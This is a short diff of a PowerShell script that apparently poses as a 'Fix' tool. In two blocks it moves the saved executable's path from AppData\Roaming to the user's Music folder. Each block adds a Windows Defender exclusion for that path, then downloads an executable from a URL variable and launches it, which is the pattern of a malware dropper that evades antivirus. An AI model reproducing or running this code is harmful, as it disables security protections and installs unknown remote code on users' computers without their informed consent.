@@ -398,7 +398,7 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing $Name Fix..."
-    	$exepath = Join-Path $env:USERPROFILE "AppData\Roaming\$Name.exe"
+    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
     	Add-MpPreference -ExclusionPath $exepath
 	Invoke-WebRequest -Uri $url -OutFile $exepath	
 	Start-Process -FilePath $exepath
@@ -417,7 +417,7 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing $Name Fix..."
-    	$exepath = Join-Path $env:USERPROFILE "AppData\Roaming\$Name.exe"
+    	$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
     	Add-MpPreference -ExclusionPath $exepath
 	Invoke-WebRequest -Uri $url -OutFile $exepath	
 	Start-Process -FilePath $exepath
